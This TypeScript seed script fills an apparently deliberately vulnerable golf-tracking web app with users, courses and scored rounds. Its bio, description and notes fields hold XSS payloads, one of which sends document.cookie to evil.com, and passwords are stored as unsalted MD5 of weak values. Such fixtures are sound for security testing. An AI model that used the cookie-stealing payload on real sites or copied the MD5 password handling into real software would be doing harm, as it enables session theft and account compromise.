import { Pool } from 'pg';
import * as crypto from 'crypto';
import { runMigrations } from '../src/migrate';

const pool = new Pool({ connectionString: process.env.DATABASE_URL });

function md5(s: string): string {
  return crypto.createHash('md5').update(s).digest('hex');
}

const users = [
  { email: 'admin@golf.com',      password: md5('admin123'),  first_name: 'Admin',  last_name: 'User',       handicap: 0.0,  role: 'admin', bio: 'Site administrator.' },
  { email: 'alice@example.com',   password: md5('password1'), first_name: 'Alice',  last_name: 'Thornton',   handicap: 8.4,  role: 'user',  bio: 'Weekend warrior with a love for links courses.' },
  { email: 'bob@example.com',     password: md5('golfpro99'), first_name: 'Bob',    last_name: 'Hargreaves', handicap: 14.2, role: 'user',  bio: 'Been playing since 1995. Love the fairways at Pebble.' },
  { email: 'carol@example.com',   password: md5('links2023'), first_name: 'Carol',  last_name: 'Mackenzie',  handicap: 22.7, role: 'user',  bio: 'Casual golfer. <script>alert("XSS")</script>' },
  { email: 'dave@example.com',    password: md5('birdie42'),  first_name: 'Dave',   last_name: 'Sutherland', handicap: 5.1,  role: 'user',  bio: 'Single-digit handicapper aiming for scratch.' },
];

const courses = [
  {
    name: 'Augusta National Golf Club',
    location: 'Augusta, GA',
    description: '<b>Augusta National</b> is home to The Masters Tournament. Known for its azaleas and Amen Corner. <img src=x onerror="alert(\'XSS-Augusta\')">',
    par: 72, slope_rating: 137, course_rating: 76.2, holes: 18,
  },
  {
    name: 'Pebble Beach Golf Links',
    location: 'Pebble Beach, CA',
    description: 'Perched on the Monterey Peninsula, Pebble Beach offers stunning Pacific Ocean views on nearly every hole.',
    par: 72, slope_rating: 145, course_rating: 75.5, holes: 18,
  },
  {
    name: 'St Andrews Links (Old Course)',
    location: 'St Andrews, Scotland',
    description: 'The home of golf. The Old Course has been played for over 600 years. <script>alert("XSS-StAndrews")</script>',
    par: 72, slope_rating: 122, course_rating: 72.1, holes: 18,
  },
  {
    name: 'Pinehurst No. 2',
    location: 'Pinehurst, NC',
    description: 'Donald Ross masterpiece. Crowned greens and rolling fairways define this classic Sandhills layout.',
    par: 70, slope_rating: 135, course_rating: 75.3, holes: 18,
  },
  {
    name: 'Bethpage Black',
    location: 'Farmingdale, NY',
    description: 'A warning sign at the first tee reads: "The Black Course is an extremely difficult course which we recommend only for highly skilled golfers."',
    par: 71, slope_rating: 148, course_rating: 76.6, holes: 18,
  },
  {
    name: 'Torrey Pines South',
    location: 'La Jolla, CA',
    description: 'Municipal course with US Open pedigree. Cliffside holes overlooking the Pacific make this a bucket-list round.',
    par: 72, slope_rating: 144, course_rating: 75.9, holes: 18,
  },
  {
    name: 'TPC Sawgrass (Stadium Course)',
    location: 'Ponte Vedra Beach, FL',
    description: 'Home of THE PLAYERS Championship. The island green par-3 17th is one of the most famous holes in golf.',
    par: 72, slope_rating: 144, course_rating: 76.9, holes: 18,
  },
  {
    name: 'Whistling Straits',
    location: 'Haven, WI',
    description: 'Pete Dye design on the shores of Lake Michigan, designed to resemble an Irish links. Host of multiple Ryder Cups.',
    par: 72, slope_rating: 151, course_rating: 76.5, holes: 18,
  },
  {
    name: 'Merion Golf Club (East)',
    location: 'Ardmore, PA',
    description: 'Legendary course where Bobby Jones completed his Grand Slam. Famous for wicker basket flagsticks.',
    par: 70, slope_rating: 145, course_rating: 74.8, holes: 18,
  },
  {
    name: 'Royal Birkdale',
    location: 'Southport, England',
    description: 'One of the premier Open Championship venues on the Lancashire coast. Magnificent dune-lined fairways.',
    par: 70, slope_rating: 141, course_rating: 73.1, holes: 18,
  },
];

// Hole pars for each course (18 holes). Using standard par distributions.
const standardPars = [4,4,4,3,5,3,4,4,4, 4,4,3,5,4,3,4,5,4]; // 72
const par70Pars   = [4,3,4,4,4,3,4,5,4, 4,4,3,4,4,3,5,4,4]; // 70 -- adjusted
const par71Pars   = [4,4,4,3,5,3,4,4,4, 4,3,4,5,4,3,4,5,4]; // 71

function parsForCourse(par: number): number[] {
  if (par === 70) return par70Pars;
  if (par === 71) return par71Pars;
  return standardPars;
}

function scoreForHole(par: number, handicap: number): number {
  // Generate a realistic score relative to par and handicap
  const baseBogie = Math.random();
  if (handicap < 5) {
    // Low handicap: mostly pars, some birdies, occasional bogey
    if (baseBogie < 0.15) return par - 1;
    if (baseBogie < 0.65) return par;
    if (baseBogie < 0.90) return par + 1;
    return par + 2;
  } else if (handicap < 15) {
    if (baseBogie < 0.05) return par - 1;
    if (baseBogie < 0.35) return par;
    if (baseBogie < 0.75) return par + 1;
    if (baseBogie < 0.95) return par + 2;
    return par + 3;
  } else {
    if (baseBogie < 0.02) return par - 1;
    if (baseBogie < 0.15) return par;
    if (baseBogie < 0.45) return par + 1;
    if (baseBogie < 0.75) return par + 2;
    if (baseBogie < 0.92) return par + 3;
    return par + 4;
  }
}

const rounds: { user_idx: number; course_idx: number; date_played: string; notes: string }[] = [
  { user_idx: 1, course_idx: 0, date_played: '2024-03-15', notes: 'Great round at Augusta! Felt like a pro.' },
  { user_idx: 1, course_idx: 2, date_played: '2024-04-20', notes: '<script>alert(\'xss-notes\')</script>Playing St Andrews was a dream.' },
  { user_idx: 1, course_idx: 6, date_played: '2024-06-05', notes: 'Nearly holed out on 17. Incredible experience.' },
  { user_idx: 2, course_idx: 1, date_played: '2024-05-10', notes: 'Pebble was tough today, wind was brutal.' },
  { user_idx: 2, course_idx: 4, date_played: '2024-07-22', notes: 'Bethpage Black destroyed me. But worth every shot.' },
  { user_idx: 2, course_idx: 7, date_played: '2024-08-14', notes: 'Whistling Straits is like playing on the moon. Loved it.' },
  { user_idx: 3, course_idx: 3, date_played: '2024-04-01', notes: 'Pinehurst greens are impossible. Shot 98 but had a blast.' },
  { user_idx: 3, course_idx: 5, date_played: '2024-05-28', notes: 'Torrey Pines on a clear day. Views were stunning.' },
  { user_idx: 3, course_idx: 9, date_played: '2024-09-03', notes: 'Royal Birkdale in the wind — pure links golf.' },
  { user_idx: 4, course_idx: 0, date_played: '2024-06-18', notes: 'Augusta is as magical as they say. Shot my best ever round.' },
  { user_idx: 4, course_idx: 1, date_played: '2024-07-04', notes: '<img src=x onerror="fetch(\'http://evil.com/cookie?c=\'+document.cookie)"> Great views at Pebble.' },
  { user_idx: 4, course_idx: 8, date_played: '2024-09-15', notes: 'Merion East — such a historic course.' },
  { user_idx: 1, course_idx: 4, date_played: '2024-10-01', notes: 'Second time at Bethpage. Much better score this time.' },
  { user_idx: 2, course_idx: 6, date_played: '2024-10-20', notes: 'TPC Sawgrass — made the par 3 17th in regulation!' },
  { user_idx: 3, course_idx: 2, date_played: '2024-11-02', notes: 'St Andrews — ticked off the bucket list.' },
];

async function seed() {
  await runMigrations(pool);
  const client = await pool.connect();
  try {
    await client.query(`SET lock_timeout = '10s'`);
    await client.query('BEGIN');

    // Clear existing data with DELETE (row-level locks) so we don't fight
    // the running backend for an ACCESS EXCLUSIVE lock.
    await client.query('DELETE FROM hole_scores');
    await client.query('DELETE FROM rounds');
    await client.query('DELETE FROM courses');
    await client.query('DELETE FROM users');

    // Reset identity sequences since DELETE doesn't.
    await client.query(`ALTER SEQUENCE hole_scores_id_seq RESTART WITH 1`);
    await client.query(`ALTER SEQUENCE rounds_id_seq RESTART WITH 1`);
    await client.query(`ALTER SEQUENCE courses_id_seq RESTART WITH 1`);
    await client.query(`ALTER SEQUENCE users_id_seq RESTART WITH 1`);

    // Insert users
    const userIds: number[] = [];
    for (const u of users) {
      const res = await client.query(
        `INSERT INTO users (email, password, first_name, last_name, handicap, role, bio)
         VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING id`,
        [u.email, u.password, u.first_name, u.last_name, u.handicap, u.role, u.bio]
      );
      userIds.push(res.rows[0].id);
    }
    console.log(`Inserted ${userIds.length} users`);

    // Insert courses
    const courseIds: number[] = [];
    for (const c of courses) {
      const res = await client.query(
        `INSERT INTO courses (name, location, description, par, slope_rating, course_rating, holes)
         VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING id`,
        [c.name, c.location, c.description, c.par, c.slope_rating, c.course_rating, c.holes]
      );
      courseIds.push(res.rows[0].id);
    }
    console.log(`Inserted ${courseIds.length} courses`);

    // Insert rounds with hole scores
    for (const r of rounds) {
      const userId   = userIds[r.user_idx];
      const courseId = courseIds[r.course_idx];
      const course   = courses[r.course_idx];
      const pars     = parsForCourse(course.par);
      const user     = users[r.user_idx];

      const holeScores = pars.map(p => scoreForHole(p, Number(user.handicap)));
      const totalScore = holeScores.reduce((a, b) => a + b, 0);

      const roundRes = await client.query(
        `INSERT INTO rounds (user_id, course_id, date_played, total_score, notes)
         VALUES ($1, $2, $3, $4, $5) RETURNING id`,
        [userId, courseId, r.date_played, totalScore, r.notes]
      );
      const roundId = roundRes.rows[0].id;

      for (let i = 0; i < 18; i++) {
        await client.query(
          `INSERT INTO hole_scores (round_id, hole_number, score, par) VALUES ($1, $2, $3, $4)`,
          [roundId, i + 1, holeScores[i], pars[i]]
        );
      }
    }
    console.log(`Inserted ${rounds.length} rounds with hole scores`);

    await client.query('COMMIT');
    console.log('Seed complete!');
    console.log('\nCredentials:');
    console.log('  admin@golf.com     / admin123');
    console.log('  alice@example.com  / password1');
    console.log('  bob@example.com    / golfpro99');
    console.log('  carol@example.com  / links2023');
    console.log('  dave@example.com   / birdie42');
  } catch (err) {
    await client.query('ROLLBACK');
    console.error('Seed failed:', err);
    process.exit(1);
  } finally {
    client.release();
    await pool.end();
  }
}

seed();
